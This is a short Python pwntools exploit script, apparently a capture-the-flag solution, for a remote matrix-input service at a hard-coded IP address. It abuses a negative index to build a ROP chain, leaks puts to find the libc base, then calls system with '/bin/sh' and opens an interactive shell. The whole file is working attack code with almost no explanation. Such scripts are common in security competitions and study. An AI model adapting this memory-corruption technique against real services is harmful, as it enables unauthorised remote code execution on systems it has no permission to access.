#!/usr/bin/python
from pwn import *
import struct

s = remote('52.68.53.28', 31337)

s.recvuntil('Enter your name\n')
s.send('hey'.ljust(1023, 'y') + '\n')
s.recvuntil('Hello ')
s.send('-15\n')

s.send(str(0)+'\n')         # rbx
s.send(str(1)+'\n')         # rbp
s.send(str(0x602018)+'\n')  # r12
s.send(str(0)+'\n')         # r13
s.send(str(0)+'\n')         # r14
s.send(str(0x602018)+'\n')  # r15
s.send(str(0x400ee0)+'\n')  # call gadget
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0x4006fd)+'\n')

for i in xrange(14):
    s.send('-\n')
s.recvuntil('Enter the (1,14) element of the first matrix : ')
s.send(str(0x400efa)+'\n')

puts = struct.unpack('<Q', s.recv(6)+'\x00\x00')[0]
libc_base = puts - 0x6fe30
system = libc_base + 0x46640


s.recvuntil('Enter your name\n')
name =  struct.pack('<Q', system)
name += ' /bin/sh ;'
s.send(name.ljust(1023, ' ') + '\n')
s.recvuntil('Hello ')
s.send('-15\n')

s.send(str(0)+'\n')         # rbx
s.send(str(1)+'\n')         # rbp
s.send(str(0x6020a0)+'\n')  # r12
s.send(str(0)+'\n')         # r13
s.send(str(0)+'\n')         # r14
s.send(str(0x6020a8)+'\n')  # r15
s.send(str(0x400ee0)+'\n')  # call gadget
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0)+'\n')
s.send(str(0x4006fd)+'\n')

for i in xrange(14):
    s.send('-\n')
s.recvuntil('Enter the (1,14) element of the first matrix : ')
s.send(str(0x400efa)+'\n')

s.interactive()
